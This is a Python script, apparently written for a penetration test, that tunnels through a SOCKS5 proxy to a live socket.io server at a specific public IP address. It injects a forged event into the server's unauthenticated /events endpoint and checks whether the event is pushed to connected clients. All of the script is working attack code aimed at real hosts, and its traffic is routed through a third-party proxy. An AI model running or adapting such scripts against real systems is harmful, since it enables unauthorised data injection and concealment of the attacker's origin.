#!/usr/bin/env python3
"""Full push-chain test: connect to 35.234.50.28:3100 /socket.io, get sid,
POST a valid event (with CaseID + TypeOfEventTxt), then poll to see if the
event is pushed back to the connected client."""
import socket, struct, json, time, sys, re

PROXY = ("202.160.76.157", 11082)
DEST = ("35.234.50.28", 3100)

def socks_tunnel():
    s = socket.create_connection(PROXY, timeout=15)
    s.sendall(b"\x05\x01\x00")
    s.recv(4)
    hb = b"35.234.50.28"
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + struct.pack(">H", 3100))
    s.settimeout(20)
    rep = b""
    while len(rep) < 4:
        c = s.recv(16)
        if not c: break
        rep += c
    if len(rep) < 2 or rep[1] != 0:
        s.close()
        return None
    return s

def http_req(s, method, path, body=None, headers=None):
    s.settimeout(20)
    h = headers or {}
    r = f"{method} {path} HTTP/1.1\r\nHost: 35.234.50.28:3100\r\nConnection: keep-alive\r\n"
    if body is not None:
        r += f"Content-Type: application/json\r\nContent-Length: {len(body.encode())}\r\n"
    for k, v in h.items():
        r += f"{k}: {v}\r\n"
    r += "\r\n"
    if body is not None:
        r += body
    s.sendall(r.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
    if b"\r\n\r\n" in buf:
        head, body2 = buf.split(b"\r\n\r\n", 1)
        m = re.search(rb"content-length:\s*(\d+)", head, re.I)
        if m:
            need = int(m.group(1))
            while len(body2) < need:
                try:
                    d = s.recv(65536)
                except socket.timeout:
                    break
                if not d:
                    break
                body2 += d
    return head.decode(errors="replace"), body2.decode(errors="replace")

# Step 1: get sid
print("=== Step 1: get socket.io session ===")
s1 = socks_tunnel()
if not s1:
    print("tunnel fail"); sys.exit(1)
head1, body1 = http_req(s1, "GET", "/socket.io/?EIO=3&transport=polling")
print(f"HEAD: {head1}")
print(f"BODY: {body1}")
m = re.search(r'"sid":"([^"]+)"', body1)
if not m:
    print("no sid found"); sys.exit(1)
sid = m.group(1)
print(f"SID: {sid}")

# Step 2: poll for events (3s)
print("\n=== Step 2: initial poll (3s) ===")
s1.settimeout(3)
try:
    d = s1.recv(65536)
    print(f"Poll response: {d.decode(errors='replace')}")
except socket.timeout:
    print("Poll timeout (no events yet)")

# Step 3: POST a valid event (with CaseID + TypeOfEventTxt)
print("\n=== Step 3: POST valid event ===")
s2 = socks_tunnel()
if s2:
    # Use a realistic CaseID and TypeOfEventTxt
    event = {
        "CaseID": "PENTEST_2026_0915_001",
        "TypeOfEventTxt": "pentest_event_marker",
        "TypeOfEventNum": 999,
        "Caption": "PENTEST_EVENT_MARKER",
        "Elapsed": 12345,
        "Value": "PENTEST_MARKER",
        "Annotation": "This event was injected by a penetration test"
    }
    body_json = json.dumps(event)
    head2, body2 = http_req(s2, "POST", "/events", body_json)
    print(f"POST HEAD: {head2}")
    print(f"POST BODY: {body2}")
    s2.close()

# Step 4: poll again to see if the event was pushed
print("\n=== Step 4: poll for pushed event (15s) ===")
s1.settimeout(15)
try:
    d = s1.recv(65536)
    print(f"Poll response: {d.decode(errors='replace')}")
except socket.timeout:
    print("Poll timeout (no events received)")

s1.close()
print("\n=== DONE ===")
